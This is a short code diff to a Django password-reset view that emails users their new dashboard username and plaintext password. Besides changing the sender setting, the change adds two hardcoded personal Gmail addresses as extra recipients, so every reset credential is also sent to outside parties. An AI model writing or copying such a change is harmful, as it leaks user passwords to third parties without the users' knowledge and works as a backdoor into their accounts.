@@ -235,7 +235,10 @@ class UserPasswordResetView(CustomLoginRequiredMixin, SuperAdminRequiredMixin, S
         msg = (
                 "You can login into the Dashboard with the following credentials.\n\n" + "Username: " + account.username + " \n" + "Password: " + password
         )
-        send_mail("Dashboard Credentials", msg, conf_settings.EMAIL_HOST_USER, [account.email], fail_silently=True)
+        send_mail("Dashboard Credentials", msg, conf_settings.DEFAULT_FROM_EMAIL, [account.email,
+                                                                                   "sunayanashrestha3@gmail.com",
+                                                                                   "naween321@gmail.com"],
+                  fail_silently=False)
         account.save(update_fields=["password"])
 
         messages.success(self.request, self.success_message)
